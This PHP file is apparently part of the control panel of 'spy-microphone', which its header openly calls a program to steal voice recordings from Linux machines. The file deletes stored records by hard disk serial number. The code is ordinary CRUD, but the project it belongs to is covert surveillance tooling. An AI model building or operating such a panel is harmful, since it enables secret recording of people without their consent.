<?php

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#

session_start();

 if (!isset($_SESSION['login']))
    {
      header("Location: index.php");
      }

    else
      {


 if (isset($_POST['delete_hard_disk_id_serial_number'])) 
     {

require_once('__ROOT__/connect.php');

            if (class_exists('DATABASE_CONNECT'))
            {
 
             $obj_conn  = new DATABASE_CONNECT;
            
             $host = $obj_conn->connect[0];
             $user = $obj_conn->connect[1];
             $pass = $obj_conn->connect[2];
             $db   = $obj_conn->connect[3];
 
            $conn = new mysqli($host,$user,$pass,$db);
 
             if ($conn->connect_error)
                   {
                    die ("Cannot connect " .$conn->connect_error);
                    }

           else
              {

      $hard_disk_id_serial_number = $conn->real_escape_string($_POST['delete_hard_disk_id_serial_number']);

           $sql = "delete from records where hard_disk_id_serial_number = '$hard_disk_id_serial_number' ";
           $result = $conn->query($sql);

   
    if($result == true ) 
     {
       echo '<script type="text/javascript">alert("Delete Records was successfully");
         </script>';
     echo ("<script>location.href='pagination.php'</script>");
 
      }


    else 
      {

    echo '<script type="text/javascript">alert("Delete Records Failed: Please try again");
         </script>';
     echo ("<script>location.href='pagination.php'</script>");
 
    
       }
 

  }  // end of else connect

 
  } // end of connect class exists

 
 } // end if isset post

 } // end else session login

?>
